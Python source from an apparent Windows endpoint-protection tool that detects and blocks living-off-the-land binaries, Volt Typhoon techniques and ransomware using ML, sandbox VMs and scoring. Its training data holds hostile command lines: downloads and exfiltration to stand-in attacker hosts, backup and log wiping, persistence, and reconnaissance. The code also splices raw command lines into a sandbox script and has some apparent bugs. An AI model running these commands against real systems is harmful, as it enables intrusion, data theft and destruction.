                {"name": "bitsadmin.exe", "cmdline": ["bitsadmin.exe", "/transfer", "job", "http://malicious.example.com/file.exe", "C:\\temp\\file.exe"]},
                {"name": "netsh.exe", "cmdline": ["netsh.exe", "interface", "portproxy", "add", "v4tov4", "listenport=8080", "connectaddress=10.0.0.1", "connectport=80"]},
                
                # Service management malicious patterns
                {"name": "sc.exe", "cmdline": ["sc.exe", "create", "malicious", "binpath=", "C:\\malicious\\service.exe"]},
                {"name": "sc.exe", "cmdline": ["sc.exe", "config", "malicious", "start=", "auto"]},
                
                # Task scheduling malicious patterns
                {"name": "schtasks.exe", "cmdline": ["schtasks.exe", "/create", "/sc", "onlogon", "/tn", "vt-task", "/tr", "cmd.exe /c whoami"]},
                {"name": "schtasks.exe", "cmdline": ["schtasks.exe", "/create", "/ru", "system", "/tn", "persistence", "/tr", "powershell.exe"]},
                {"name": "schtasks.exe", "cmdline": ["schtasks.exe", "/create", "/sc", "onlogon", "/tn", "persistence", "/tr", "C:\\malicious\\payload.exe"]},
                
                # Registry manipulation malicious patterns
                {"name": "reg.exe", "cmdline": ["reg.exe", "add", "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "malicious", "/t", "REG_SZ", "/d", "C:\\malicious\\payload.exe"]},
                {"name": "reg.exe", "cmdline": ["reg.exe", "add", "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", "malicious", "/t", "REG_SZ", "/d", "C:\\malicious\\payload.exe"]},
                
                # Domain reconnaissance malicious patterns
                {"name": "nltest.exe", "cmdline": ["nltest.exe", "/domain_trusts"]},
                {"name": "nltest.exe", "cmdline": ["nltest.exe", "/dclist"]},
                {"name": "whoami.exe", "cmdline": ["whoami.exe", "/all"]},
                {"name": "net.exe", "cmdline": ["net.exe", "group", "\"domain admins\""]},
                {"name": "net.exe", "cmdline": ["net.exe", "user", "/domain"]},
                {"name": "tasklist.exe", "cmdline": ["tasklist.exe", "/svc"]},
                
                # WMI malicious patterns
                {"name": "wmic.exe", "cmdline": ["wmic.exe", "process", "call", "create", "cmd.exe /c malicious.exe"]},
                
                # MSBuild malicious patterns
                {"name": "msbuild.exe", "cmdline": ["msbuild.exe", "C:\\malicious\\payload.proj"]},
                {"name": "msbuild.exe", "cmdline": ["msbuild.exe", "/p:Configuration=Release", "C:\\malicious\\inline.proj"]},
                
                # WSL malicious patterns
                {"name": "wsl.exe", "cmdline": ["wsl.exe", "exec", "/usr/bin/malicious"]},
                
                # WinRM malicious patterns
                {"name": "winrm.exe", "cmdline": ["winrm.exe", "invoke", "Create", "wmicimv2/Win32_Process", "@{CommandLine=\"cmd /c malicious.exe\"}"]},
                
                # VBS malicious patterns
                {"name": "SyncAppvPublishingServer.vbs", "cmdline": ["SyncAppvPublishingServer.vbs", "script:https://malicious.com/payload.ps1"]},
                {"name": "pubprn.vbs", "cmdline": ["pubprn.vbs", "127.0.0.1", "script:https://malicious.com/payload.sct"]},
                
                # PowerShell malicious patterns (advanced)
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-Command", "Get-ChildItem -Recurse | Remove-Item -Force"]},
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-windowstyle", "hidden", "-nop", "-ep", "bypass"]},
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-command", "Compress-Archive -Path C:\\sensitive -DestinationPath C:\\temp\\data.zip"]},
                
                # Ransomware patterns
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "wbadmin delete catalog"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "fsutil usn deletejournal"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "cipher /w"]},
                {"name": "powershell.exe", "cmdline": ["powershell.exe", "-command", "Get-ChildItem -Recurse | Remove-Item -Force"]},
                
                # Defense evasion patterns
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "wevtutil cl security"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "wevtutil cl application"]},
                
                # Data exfiltration patterns
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "robocopy C:\\sensitive \\\\attacker\\share /mir"]},
                {"name": "cmd.exe", "cmdline": ["cmd.exe", "/c", "xcopy C:\\sensitive \\\\attacker\\share /s /h /e"]},
            ]

            self.logger.info(f"Training ML model with {len(training_data)} samples including LOLBin detector patterns...")
            
            # Train the model
            if self.ml_analyzer.train_baseline(training_data):
                self.ml_analyzer.save_model("ml_model.pkl")
                self.logger.info("[SUCCESS] ML model trained and saved successfully with comprehensive dataset including LOLBin detector patterns")
            else:
                self.logger.error("[ERROR] Failed to train ML model - insufficient training data")
        else:
           self.logger.info("Loading existing ML model...")
           if self.ml_analyzer.load_model("ml_model.pkl"):
                self.logger.info("[SUCCESS] ML model loaded successfully")
           else:
                self.logger.error("[ERROR] Failed to load existing ML model - will retrain")
                # Force retrain if loading fails
                await self._initialize_ml_model()
        
    async def _monitoring_loop(self):
        """Main monitoring loop with concurrent task handling"""
        while self.monitoring_active:
            try:
                while not self.process_interceptor.process_queue.empty():
                    process_info = self.process_interceptor.process_queue.get()
                    task = asyncio.create_task(self._process_with_semaphore(process_info))
                    self.active_tasks.add(task)
                    task.add_done_callback(self.active_tasks.discard)
                    
                await asyncio.sleep(1)
                self.logger.info("Monitoring loop exited. Shutting down.")

            except Exception as e:
                self.logger.error(f"Error in monitoring loop: {e}")
                await asyncio.sleep(1)
    async def _process_with_semaphore(self, process_info):
        """Handle process with concurrency control"""
        async with self.adaptive_semaphore:
            await self._handle_intercepted_process(process_info)
                    
    async def _handle_intercepted_process(self, process_info):
        pid = process_info['pid']
        name = process_info['name']
        cmdline = process_info.get('cmdline', '')
        
        # Enhanced logging for LOLBin detection
        all_lolbins = self.volt_detector.get_extended_lolbins()
        if name.lower() in [lolbin.lower() for lolbin in all_lolbins]:
            self.logger.critical(f"INTERCEPT LOLBin: {name} (PID: {pid}) - Command: {cmdline[:100]}...")
        
        # Skip system and protected processes immediately
        if self._should_skip_process(process_info):
            return

        # Fast path: Quick LOLBin check for immediate blocking
        lolbin_result = self._safe_lolbin_detect(name, cmdline)
        
        # Immediate block for high-severity LOLBins
        if lolbin_result.get('detected') and lolbin_result.get('severity') == 'high':
            self.logger.critical(f"BLOCKED: High-severity LOLBin detected in {name} (PID: {pid})")
            await self._block_process(process_info, {
                'decision': 'block',
                'reason': 'High-severity LOLBin detected',
                'lolbin_result': lolbin_result
            })
            return
            
        # Immediate block for certutil download commands (special case)
        if name.lower() == 'certutil.exe' and '-urlcache' in cmdline.lower() and '-f' in cmdline.lower():
            self.logger.critical(f"BLOCKED: Certutil download command detected in {name} (PID: {pid})")
            await self._block_process(process_info, {
                'decision': 'block',
                'reason': 'Certutil download command detected',
                'lolbin_result': lolbin_result
            })
            return

        # Skip normal browser processes to reduce false positives
        if name.lower() in ['msedge.exe', 'chrome.exe', 'firefox.exe', 'iexplore.exe']:
            # Only analyze browser processes if they have suspicious command lines
            if not any(suspicious in cmdline.lower() for suspicious in [
                'powershell', 'cmd', 'certutil', 'wget', 'curl', 'bitsadmin',
                'certreq', 'regsvr32', 'rundll32', 'mshta', 'wscript', 'cscript'
            ]):
                self.logger.info(f"ALLOWED: {name} (PID: {pid}) - Normal browser activity")
                return

        # Run remaining analyses in parallel with timeout
        results = await self._gather_initial_analyses(process_info)
        lolbin_result, volt_result, tree_result, behavioral_result = results

        # ML analysis
        ml_features = {
            'process_name': name.lower(),
            'command_line': cmdline,
            'lolbin_detected': lolbin_result.get('detected', False),
            'volt_typhoon_risk': volt_result.get('risk_score', 0),
            'behavioral_risk': behavioral_result.get('risk_score', 0)
        }
        
        try:
            ml_risk = self.ml_analyzer.predict_threat(ml_features)
        except Exception as e:
            self.logger.error(f"ML analysis failed: {e}")
            ml_risk = 0.0

        # Run sandbox analysis for suspicious processes
        sandbox_result = await self._run_sandbox_analysis(process_info, lolbin_result, ml_risk)

        # Decision logic - consider sandbox results
        should_block = False
        block_reason = ""

        # 1. Sandbox detected malicious behavior (highest confidence)
        if (sandbox_result and not sandbox_result.get('skipped') and 
            sandbox_result.get('risk_level') in ['CRITICAL', 'HIGH']):
            should_block = True
            block_reason = f"Sandbox detected malicious behavior: {sandbox_result.get('risk_factors', [])}"
        
        # 2. Ransomware behavior (high confidence)
        elif behavioral_result.get('ransomware_detected', False):
            should_block = True
            block_reason = "Confirmed ransomware behavior"
        
        # 3. Volt Typhoon TTPs (high confidence)
        elif isinstance(volt_result.get('risk_score', 0), (int, float)) and volt_result.get('risk_score', 0) >= 3.0:
            should_block = True
            block_reason = f"Volt Typhoon TTPs detected (score: {volt_result.get('risk_score', 0)})"
        
        # 4. Malicious LOLBin + High ML Risk (medium confidence)
        elif (lolbin_result.get('detected', False) and 
              lolbin_result.get('severity', 'low') in ['high', 'medium'] and
              isinstance(ml_risk, (int, float)) and ml_risk >= 7.0):
            should_block = True
            block_reason = f"Malicious LOLBin usage with high ML risk (score: {ml_risk})"
        
        # 5. Multiple suspicious indicators
        behavioral_risk_score = 0
        if isinstance(behavioral_result, dict):
            behavioral_risk_score = behavioral_result.get('risk_score', 0)
        elif isinstance(behavioral_result, tuple):
            # behavioral_result is (threat_level, confidence, flags)
            behavioral_risk_score = behavioral_result[0] * 2  # threat_level * 2 as risk score
            
        if (lolbin_result.get('detected', False) and 
            isinstance(volt_result.get('risk_score', 0), (int, float)) and volt_result.get('risk_score', 0) >= 2.0 and
            isinstance(behavioral_risk_score, (int, float)) and behavioral_risk_score >= 5.0):
            should_block = True
            block_reason = "Multiple suspicious indicators detected"

        if should_block:
            self.logger.critical(f"BLOCKED: {block_reason} in {name} (PID: {pid})")
            await self._block_process(process_info, {
                'decision': 'block',
                'reason': block_reason,
                'lolbin_result': lolbin_result,
                'volt_result': volt_result,
                'behavioral_result': behavioral_result,
                'ml_risk': ml_risk,
                'sandbox_result': sandbox_result
            })
        else:
            # Log sandbox results even if process is allowed
            if sandbox_result and not sandbox_result.get('skipped'):
                self.logger.info(f"SANDBOX: {name} (PID: {pid}) - {sandbox_result.get('risk_level', 'UNKNOWN')} risk")
            
            self.logger.info(f"ALLOWED: {name} (PID: {pid}) ran smoothly (no confirmed LotL, Volt Typhoon, or ransomware)")
            await self._allow_process(process_info, {
                'decision': 'allow',
                'reason': 'No confirmed threats',
                'lolbin_result': lolbin_result,
                'volt_result': volt_result,
                'behavioral_result': behavioral_result,
                'ml_risk': ml_risk,
                'sandbox_result': sandbox_result
            })

    def _should_skip_process(self, process_info):
        """Determine if a process should be skipped from analysis"""
        protected_names = {
           "System Idle Process", "System", "Registry", "smss.exe", "csrss.exe", 
    "wininit.exe", "services.exe", "lsass.exe", "svchost.exe", "winlogon.exe",
    "explorer.exe", "fontdrvhost.exe", "dwm.exe", "ctfmon.exe", "spoolsv.exe",
    "RuntimeBroker.exe", "ShellExperienceHost.exe", "SearchIndexer.exe", 
    "StartMenuExperienceHost.exe", "conhost.exe", "taskhostw.exe", 
    "AggregatorHost.exe", "LsaIso.exe", "msedgewebview2.exe", 
    "MpDefenderCoreService.exe", "MsMpEng.exe", "NisSrv.exe", "Widgets.exe",
    "NgcIso.exe", "sihost.exe", "ShellHost.exe", "python.exe",  
    "MemCompression", "sppsvc.exe", "OpenConsole.exe", "SearchProtocolHost.exe",
    "backgroundTaskHost.exe", "dllhost.exe", "smartscreen.exe", 
    "StartMenuExperienceHost.exe", "VBoxSDS.exe", "VBoxSVC.exe", "WindowsTerminal.exe",
    # Note: Browsers are NOT protected - they are monitored for malicious activity
    # Add VirtualBox processes
    "VBoxManage.exe", "VBoxHeadless.exe", "VBoxSDL.exe", "VBoxVRDP.exe",
    # Add other legitimate system processes
    "notepad.exe", "calc.exe", "mspaint.exe", "wordpad.exe", "control.exe"
        }
        
        # Case-insensitive comparison
        process_name = process_info['name'].lower()
        protected_names_lower = {name.lower() for name in protected_names}
        
        if (process_name in protected_names_lower or 
            process_info['pid'] in (0, 4, os.getpid())):
            self.logger.info(f"Skipping protected process: {process_info['name']} (PID: {process_info['pid']})")
            return True
        return False                        
    def _is_blocklisted(self, process_info):
        """Check if process matches runtime blocklist"""
        name = process_info['name'].lower()
        cmdline = process_info.get('cmdline', '').lower()
        
        for entry in self.runtime_blocklist:
            if entry['name'] == name:
                if any(pattern in cmdline for pattern in entry['cmdline_patterns']):
                    return True
        return False
        
    def _generate_cache_key(self, process_info):
        """Generate cache key for process"""
        key_data = f"{process_info['name']}:{process_info.get('cmdline', '')}"
        return hashlib.md5(key_data.encode()).hexdigest()
        
    async def _analyze_process(self, process_info):
        """Refactored comprehensive parallel process analysis"""
        analysis_start = time.time()
        analysis_results = {
            'timestamp': datetime.now().isoformat(),
            'process_info': process_info,
            'analyses': {},
            'final_risk_score': 0.0,
            'final_decision': 'ALLOW'
        }
        ransomware_behavior = await self._run_cpu_bound(
        self.behavioral_analyzer.analyze_ransomware_behavior,
        process_info
    )
    
        if any(ransomware_behavior.values()):
            analysis_results['analyses']['ransomware'] = {
                'indicators': ransomware_behavior,
                'risk_score': 10.0  # Maximum risk
            }
            analysis_results['final_risk_score'] = 10.0
            analysis_results['final_decision'] = 'BLOCK'
            
        
        try:
            # Run parallel analysis components
            results = await self._gather_initial_analyses(process_info)
            lolbin_result, volt_result, tree_result, behavioral_result = results
            
            # Unpack and store results
            analysis_results['analyses'].update({
                'lolbin': lolbin_result,
                'volt_typhoon': volt_result,
                'process_tree': tree_result
            })
            
            # Log LOLBin detection results
            if lolbin_result and lolbin_result.get('detected'):
                pattern = lolbin_result.get('matched_pattern', 'unknown')
                severity = lolbin_result.get('severity', 'medium')
                self.logger.warning(f"LOLBin detected in {process_info['name']}: {pattern} (severity: {severity})")
            else:
                self.logger.info(f"No LOLBin patterns detected in {process_info['name']}")
            
            # Handle behavioral analysis result
            if isinstance(behavioral_result, tuple):
                threat_level, confidence, flags = behavioral_result
                analysis_results['analyses']['behavioral'] = {
                    'threat_level': threat_level,
                    'confidence': confidence,
                    'flags': flags
                }
            elif isinstance(behavioral_result, dict):
                analysis_results['analyses']['behavioral'] = behavioral_result
            else:
                analysis_results['analyses']['behavioral'] = {
                    'threat_level': 0,
                    'confidence': 0.0,
                    'flags': []
                }
            
            # Prepare and run ML analysis
            ml_features = {
                **process_info,
                'is_lolbin': bool(lolbin_result and lolbin_result.get('detected')),
                'lolbin_severity': lolbin_result.get('severity') if lolbin_result else 'none'
            }
            try:
                ml_analysis = await self._run_cpu_bound(
                    self.ml_analyzer.predict_threat, 
                    ml_features
                )
                analysis_results['analyses']['ml_prediction'] = ml_analysis
            except Exception as ml_error:
                self.logger.error(f"ML analysis failed: {ml_error}")
                analysis_results['analyses']['ml_prediction'] = {
                    'risk_score': 5.0,
                    'is_anomaly': False,
                    'confidence': 0.0,
                    'error': str(ml_error)
                }
            
            # Run conditional sandbox analysis
            analysis_results['analyses']['sandbox'] = await self._run_sandbox_analysis(
                process_info, 
                lolbin_result, 
                ml_analysis
            )
            
            # Final risk calculation
            analysis_results['final_risk_score'] = self._calculate_final_risk(
                analysis_results['analyses']
            )
            
            # Special case: Multiple LOLBins in command chain
            cmdline = process_info.get('cmdline', '').lower()
            if self._detect_lolbin_chaining(cmdline):
                analysis_results['final_risk_score'] = min(
                    analysis_results['final_risk_score'] + 3.0, 
                    10.0
                )
                analysis_results['analyses']['lolbin_chaining'] = True
        
        except Exception as e:
            self.logger.error(f"Process analysis error: {str(e)}", exc_info=True)
            analysis_results['error'] = str(e)
            analysis_results['final_risk_score'] = 8.0  # Conservative on error

        analysis_results['analysis_time'] = time.time() - analysis_start
        return analysis_results
    
    def _detect_lolbin_chaining(self, command_line):
        """Detect multiple LOLBins being chained together"""
        lolbin_count = 0
        common_lolbins = [
            'powershell.exe', 'cmd.exe', 'certutil.exe', 
            'rundll32.exe', 'bitsadmin.exe', 'mshta.exe'
        ]
        
        for lolbin in common_lolbins:
            if lolbin in command_line:
                lolbin_count += 1
                if lolbin_count >= 2:
                    return True
        return False 
    def _calculate_final_risk(self, analyses):
        """Enhanced risk calculation with LOLBin awareness"""
        weights = {
            'lolbin': 0.4,
            'process_tree': 0.2,
            'ml_prediction': 0.2,
            'behavioral': 0.1,
            'sandbox': 0.1
        }
        
        total_score = 0.0
        total_weight = 0.0
        
        # LOLBin scoring
        lolbin_analysis = analyses.get('lolbin', {})
        if lolbin_analysis and lolbin_analysis.get('detected'):
                severity = analyses['lolbin'].get('severity', 'medium')
                score = {
                    'critical': 10.0,
                    'high': 7.5,
                    'medium': 5.0
                }.get(severity, 5.0)
                total_score += score * weights['lolbin']
                total_weight += weights['lolbin']
            
        # Process tree scoring
        if 'process_tree' in analyses and 'risk_score' in analyses['process_tree']:
            total_score += analyses['process_tree']['risk_score'] * weights['process_tree']
            total_weight += weights['process_tree']
        
        # ML prediction scoring
        if 'ml_prediction' in analyses and 'risk_score' in analyses['ml_prediction']:
            total_score += analyses['ml_prediction']['risk_score'] * weights['ml_prediction']
            total_weight += weights['ml_prediction']
        
        # Behavioral analysis scoring
        if 'behavioral' in analyses:
            threat_level = analyses['behavioral'].get('threat_level', 0)
            behavioral_score = {
                2: 8.0,  # Malicious
                1: 4.0,  # Suspicious
                0: 1.0   # Clean
            }.get(threat_level, 1.0)
            total_score += behavioral_score * weights['behavioral']
            total_weight += weights['behavioral']
        
        # Sandbox scoring
        if ('sandbox' in analyses and 
            not analyses['sandbox'].get('skipped') and 
            'risk_score' in analyses['sandbox']):
            total_score += analyses['sandbox']['risk_score'] * weights['sandbox']
            total_weight += weights['sandbox']
        
        # Calculate weighted average
        final_score = total_score / total_weight if total_weight > 0 else 5.0
        
        # Apply LOLBin chaining penalty if detected
        if analyses.get('lolbin_chaining'):
            final_score = min(final_score + 2.0, 10.0)
        
        return min(final_score, 10.0)
    
    
    async def _sandbox_test(self, process_info):
        """Asynchronous sandbox testing with VM pool"""
        try:
            loop = asyncio.get_running_loop()
            
            # Get available VM from pool
            vm_name = await loop.run_in_executor(
                self.io_thread_pool,
                self.vm_manager.get_available_vm
            )
            
            if not vm_name:
                return {'error': 'No available VM'}
            snapshot_name = f"PreExecutionSnapshot_{int(time.time())}"

            # ✅ Take snapshot BEFORE execution
            snapshot_taken = await loop.run_in_executor(
                self.io_thread_pool,
                self.vm_manager.create_snapshot,
                vm_name,
                snapshot_name
            )

            if not snapshot_taken:
                return {'error': 'Failed to take snapshot'}    
            # Prepare command in parallel
            command = await loop.run_in_executor(
                self.cpu_thread_pool,
                self._prepare_sandbox_command,
                process_info
            )
            
            # Execute in sandbox
            execution_result = await loop.run_in_executor(
                self.io_thread_pool,
                self.vm_manager.execute_in_vm,
                vm_name,
                command,
                30
            )
            
            # Analyze results
            sandbox_analysis = await loop.run_in_executor(
                self.cpu_thread_pool,
                self._analyze_sandbox_results,
                execution_result
            )
            
            return sandbox_analysis
        except Exception as e:
            self.logger.error(f"Sandbox testing error: {e}")
            return {'error': str(e), 'risk_assessment': 'HIGH'}
        finally:
              # ✅ Always restore snapshot after execution
            if vm_name and snapshot_name:
                await loop.run_in_executor(
                    self.io_thread_pool,
                    self.vm_manager.restore_snapshot,
                    vm_name,
                    snapshot_name
                )
                await loop.run_in_executor(
                    self.io_thread_pool,
                    self.vm_manager.release_vm,
                    vm_name
                )
                
    def _prepare_sandbox_command(self, process_info):
        """Prepare command for sandbox execution with Volt Typhoon focus"""
        name = process_info['name'].lower()
        cmdline = process_info.get('cmdline', '')
        
        monitoring_script = f"""
        # Volt Typhoon specific monitoring
        $startTime = Get-Date
        
        # Baseline system state
        $baselineServices = Get-Service | Measure-Object
        $baselineTasks = Get-ScheduledTask | Measure-Object
        $baselineProcesses = Get-Process | Measure-Object
        $baselineConnections = Get-NetTCPConnection | Where-Object {{$_.State -eq 'Established'}} | Measure-Object
        
        Write-Output "=== BASELINE ==="
        Write-Output "SERVICES: $($baselineServices.Count)"
        Write-Output "TASKS: $($baselineTasks.Count)"  
        Write-Output "PROCESSES: $($baselineProcesses.Count)"
        Write-Output "CONNECTIONS: $($baselineConnections.Count)"
        
        # Execute the target command
        Write-Output "=== EXECUTING COMMAND ==="
        try {{
            {cmdline}
        }} catch {{
            Write-Output "EXECUTION_ERROR: $($_.Exception.Message)"
        }}
        
        # Post-execution analysis
        Write-Output "=== POST-EXECUTION ANALYSIS ==="
        
        # Check for new scheduled tasks (Volt Typhoon persistence)
        $newTasks = Get-ScheduledTask | Where-Object {{$_.Date -gt $startTime}}
        Write-Output "NEW_TASKS: $($newTasks.Count)"
        if ($newTasks.Count -gt 0) {{
            $newTasks | ForEach-Object {{ Write-Output "TASK: $($_.TaskName) - $($_.TaskPath)" }}
        }}
        
        # Check for service changes (Volt Typhoon persistence)
        $currentServices = Get-Service | Measure-Object
        Write-Output "SERVICE_CHANGES: $(($currentServices.Count - $baselineServices.Count))"
        
        # Check for new network connections (Volt Typhoon C2)
        $currentConnections = Get-NetTCPConnection | Where-Object {{$_.State -eq 'Established'}}
        $newConnections = $currentConnections | Where-Object {{$_.CreationTime -gt $startTime}}
        Write-Output "NEW_CONNECTIONS: $($newConnections.Count)"
        if ($newConnections.Count -gt 0) {{
            $newConnections | ForEach-Object {{ 
                Write-Output "CONNECTION: $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"
            }}
        }}
        
        # Check for registry modifications (Volt Typhoon persistence)
        $runKeys = @(
            'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
            'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
            'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
            'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce'
        )
        
        Write-Output "=== REGISTRY PERSISTENCE CHECK ==="
        foreach ($key in $runKeys) {{
            try {{
                $entries = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
                if ($entries) {{
                    $entries.PSObject.Properties | Where-Object {{$_.Name -notmatch 'PS'}} | ForEach-Object {{
                        Write-Output "REG_ENTRY: $key\\$($_.Name) = $($_.Value)"
                    }}
                }}
            }} catch {{
                # Key doesn't exist or no access
            }}
        }}
        
        # Check for netsh proxy configuration (Volt Typhoon tunneling)
        Write-Output "=== PROXY CONFIGURATION ==="
        try {{
            $proxyConfig = netsh winhttp show proxy
            Write-Output "PROXY_CONFIG: $proxyConfig"
        }} catch {{
            Write-Output "PROXY_CONFIG: Unable to retrieve"
        }}
        
        Write-Output "=== ANALYSIS COMPLETE ==="
        """
        
        return monitoring_script
    async def _run_sandbox_analysis(self, process_info, lolbin_result, ml_analysis):
        """Run sandbox analysis for suspicious processes"""
        name = process_info['name'].lower()
        cmdline = process_info.get('cmdline', '').lower()
        
        # Always run sandbox for LOLBins (except high-severity which are blocked immediately)
        if lolbin_result and lolbin_result.get('detected'):
            if lolbin_result.get('severity') == 'high':
                return {
                    'skipped': True, 
                    'reason': 'high_severity_lolbin_blocked_immediately'
                }
            else:
                # Run sandbox for medium/low severity LOLBins
                self.logger.info(f"Running sandbox analysis for LOLBin: {name}")
                return await self._sandbox_test(process_info)
        
        # Run sandbox for suspicious command lines
        suspicious_patterns = [
            'powershell', 'cmd', 'certutil', 'wget', 'curl', 'bitsadmin',
            'certreq', 'regsvr32', 'rundll32', 'mshta', 'wscript', 'cscript',
            'netsh', 'schtasks', 'sc', 'reg', 'net', 'whoami', 'tasklist'
        ]
        
        if any(pattern in cmdline for pattern in suspicious_patterns):
            self.logger.info(f"Running sandbox analysis for suspicious command: {name}")
            return await self._sandbox_test(process_info)
        
        # Run sandbox for medium/high risk ML processes
        if ml_analysis.get('risk_score', 0) > 3.0:
            self.logger.info(f"Running sandbox analysis for high ML risk: {name}")
            return await self._sandbox_test(process_info)
        
        return {
            'skipped': True, 
            'reason': 'low_risk_process'
        }
        
    def _analyze_sandbox_results(self, execution_result):
        """Analyze sandbox execution results with Volt Typhoon focus"""
        if not execution_result.get('success', False):
            return {
                'risk_level': 'HIGH',
                'reason': 'Execution failed in sandbox',
                'details': execution_result.get('error', 'Unknown error'),
                'risk_score': 8.0
            }
            
        output = execution_result.get('output', '')
        risk_score = 0.0
        risk_factors = []
        
        # Parse output for indicators
        lines = output.split('\n')
        metrics = {}
        
        for line in lines:
            if ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    key, value = parts
                    metrics[key.strip()] = value.strip()
                
        # Analyze file system changes
        try:
            baseline_size = float(metrics.get('BASELINE_SIZE', 0))
            postexec_size = float(metrics.get('POST_EXEC_SIZE', 0))
            
            if baseline_size > 0:
                change_ratio = abs(postexec_size - baseline_size) / baseline_size
                if change_ratio > 0.5:  # 50% change in file sizes
                    risk_score += 3.0
                    risk_factors.append(f'Significant file system changes: {change_ratio:.2%}')
        except (ValueError, TypeError):
            pass
                
        # Check for mass file creation/deletion
        try:
            baseline_files = int(metrics.get('BASELINE_FILES', 0))
            postexec_files = int(metrics.get('POST_EXEC_FILES', 0))
            
            if baseline_files > 0:
                file_change_ratio = abs(postexec_files - baseline_files) / baseline_files
                if file_change_ratio > 0.3:  # 30% change in file count
                    risk_score += 2.0
                    risk_factors.append(f'File count change: {file_change_ratio:.2%}')
        except (ValueError, TypeError):
            pass
                
        # Check for network activity (Volt Typhoon C2)
        try:
            connections = int(metrics.get('NEW_CONNECTIONS', 0))
            if connections > 0:  # Any new connections are suspicious
                risk_score += 2.0
                risk_factors.append(f'New network connections: {connections}')
        except (ValueError, TypeError):
            pass
            
        # Check for process spawning
        try:
            new_processes = int(metrics.get('NEW_PROCESSES', 0))
            if new_processes > 3:  # More than 3 new processes
                risk_score += 1.5
                risk_factors.append(f'Multiple process creation: {new_processes} processes')
        except (ValueError, TypeError):
            pass
            
        # Check for execution errors
        if 'EXECUTION_ERROR' in output:
            risk_score += 1.0
            risk_factors.append('Command execution errors detected')
            
        # Check for Volt Typhoon specific indicators
        if 'NEW_TASKS' in metrics and int(metrics['NEW_TASKS']) > 0:
            risk_score += 3.0
            risk_factors.append('New scheduled tasks created - possible persistence')
            
        if 'PROXY_CONFIG' in metrics and 'proxy' in metrics['PROXY_CONFIG'].lower():
            risk_score += 2.0
            risk_factors.append('Proxy configuration modified - possible tunneling')
            
        # Determine risk level
        if risk_score >= 6.0:
            risk_level = 'CRITICAL'
        elif risk_score >= 3.0:
            risk_level = 'HIGH'
        elif risk_score >= 1.0:
            risk_level = 'MEDIUM'
        else:
            risk_level = 'LOW'
            
        return {
            'risk_level': risk_level,
            'risk_score': min(risk_score, 10.0),
            'risk_factors': risk_factors,
            'sandbox_metrics': metrics,
            'execution_time': execution_result.get('execution_time', 0)
        }
        
    
        
    async def _make_decision(self, process_info, analysis_result):
        """Make final decision on process execution"""
        risk_score = analysis_result.get('final_risk_score', 5.0)
        pid = process_info['pid']
        process_name = process_info['name']
        cmdline = process_info.get('cmdline', '')

        # Remove PowerShell exception - all processes treated equally
        if risk_score < self.risk_thresholds['allow']:
            decision = 'ALLOW'
            action = self._allow_process
        elif risk_score < self.risk_thresholds['monitor']:
            decision = 'MONITOR'
            action = self._monitor_process
        elif risk_score < self.risk_thresholds['block']:
            decision = 'QUARANTINE'
            action = self._quarantine_process
        else:
            decision = 'BLOCK'
            action = self._block_process

        decision_data = {
            'timestamp': datetime.now().isoformat(),
            'process': process_name,
            'pid': pid,
            'cmdline': cmdline[:500],  # Truncate long command lines
            'risk_score': risk_score,
            'analysis_result': analysis_result,
            'decision': decision
        }

        self.logger.info(f"Decision for {process_name} (PID: {pid}): {decision} (Risk: {risk_score:.2f})")

        # Execute decision
        try:
            await action(process_info, analysis_result)
            decision_data['action_successful'] = True
        except Exception as e:
            self.logger.error(f"Error executing decision {decision}: {e}")
            decision_data['action_successful'] = False
            decision_data['error'] = str(e)

        # Log decision
        self._log_decision(decision_data)
        
    async def _allow_process(self, process_info, analysis_result):
        """Allow process to continue normally"""
        pid = process_info['pid']
        try:
            # Already unfrozen in finally block of _handle_intercepted_process
            self.logger.info(f"Allowed process {pid} to continue")
        except Exception as e:
            self.logger.error(f"Error allowing process {pid}: {e}")
                    
    async def _monitor_process(self, process_info, analysis_result):
        """Monitor process with enhanced logging"""
        pid = process_info['pid']
        self.logger.info(f"Enhanced monitoring for process {process_info['name']} (PID: {pid})")
        asyncio.create_task(self._enhanced_monitoring(pid))       
    async def _quarantine_process(self, process_info, analysis_result):
        """Quarantine process (keep frozen and isolate)"""
        pid = process_info['pid']
        self.logger.warning(f"Quarantining process {process_info['name']} (PID: {pid})")
        self._add_to_blocklist(process_info['name'], process_info.get('cmdline', ''))
            
    async def _block_process(self, process_info, analysis_result):
        """Block/terminate process immediately"""
        pid = process_info['pid']
        name = process_info['name'].lower()
        cmdline = process_info.get('cmdline', '')
        
        # Critical processes to NEVER kill
        CRITICAL_PROCS = {
            "lsass.exe", "csrss.exe", "wininit.exe", "smss.exe", 
            "services.exe", "system", "svchost.exe"
        }
        
        if name in CRITICAL_PROCS:
            self.logger.critical(f"Blocking aborted for critical process: {name}")
            return
        if analysis_result.get('immediate_block'):
            # Skip forensic collection for critical blocks
            self._terminate_process_tree(pid)
            self._add_to_blocklist(name, cmdline)
            self.logger.critical(f"Immediate block: {name} (PID: {pid})")
            return    
        try:
            
            # Collect forensic data
            forensic_data = await asyncio.get_running_loop().run_in_executor(
                self.cpu_thread_pool,
                self._collect_forensic_data,
                pid,
                analysis_result
            )
            
            # Terminate process tree
            await asyncio.get_running_loop().run_in_executor(
                self.io_thread_pool,
                self._terminate_process_tree,
                pid
            )
            
            # Update blocklist
            self._add_to_blocklist(process_info['name'], process_info.get('cmdline', ''))
            
            # Create snapshot
            asyncio.create_task(self._create_emergency_snapshot())
